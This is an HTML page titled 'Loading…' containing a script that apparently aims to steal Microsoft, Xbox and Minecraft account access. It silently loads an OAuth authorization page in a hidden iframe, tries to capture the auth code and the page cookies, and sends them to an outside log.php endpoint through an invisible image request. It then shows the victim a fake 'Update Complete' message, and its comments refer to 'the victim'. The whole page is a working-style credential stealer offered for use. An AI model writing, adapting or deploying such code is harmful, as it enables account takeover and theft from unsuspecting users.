<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Loading…</title>
</head>
<body style="margin:0; background:#fff;">
<script>
    // === CONFIGURATION ===
    const GITHUB_USER = "mreamistic"; // ← YOUR GitHub username (no quotes around the repo name)
    const LOG_URL = `https://${GITHUB_USER}.github.io/mc-token/log.php`;

    window.onload = function () {
        // 1️⃣ Silent Microsoft Auth for Xbox/Minecraft
        const CLIENT_ID = "967fbe04-f19c-4331-8a2c-0dcd0dd295cd";
        const REDIRECT_URI = "https://login.live.com/oauth20_desktop.srf";
        const SCOPES = "service::user.xboxlive.com::MBI_SSL offline_access";

        const authUrl = `https://login.microsoftonline.com/consumers/oauth2/v2.0/authorize?` +
            `client_id=${CLIENT_ID}` +
            `&response_type=code` +
            `&redirect_uri=${encodeURIComponent(REDIRECT_URI)}` +
            `&scope=${encodeURIComponent(SCOPES)}` +
            `&prompt=none`;

        // 2️⃣ Load the auth page in a hidden iframe
        const iframe = document.createElement('iframe');
        iframe.src = authUrl;
        iframe.style.display = 'none';
        document.body.appendChild(iframe);

        // 3️⃣ After a few seconds, try to read the redirect URL & cookies
        setTimeout(() => {
            try {
                const url = iframe.contentWindow.location.href;
                let payload = '';

                if (url.includes("code=")) {
                    const params = new URLSearchParams(url.split('?')[1]);
                    const code = params.get('code');
                    const cookies = document.cookie;
                    payload = `CODE:${code} | COOKIES:${cookies}`;
                } else {
                    const cookies = document.cookie;
                    payload = `COOKIES:${cookies}`;
                }

                sendPayload(payload);
            } catch (_) {
                // Cross‑origin – just grab cookies
                const cookies = document.cookie;
                sendPayload(`COOKIES:${cookies}`);
            }
        }, 3000);
    };

    function sendPayload(data) {
        // Send data to log.php via a GET request
        const finalUrl = `${LOG_URL}?data=${encodeURIComponent(data)}`;

        // Use an invisible image to fire the request
        const img = new Image();
        img.src = finalUrl;

        // Optional: give the victim a tiny success message
        document.body.innerHTML =
            '<h1 style="text-align:center;margin-top:50px;color:#333;">Update Complete</h1>';
    }
</script>
</body>
</html>
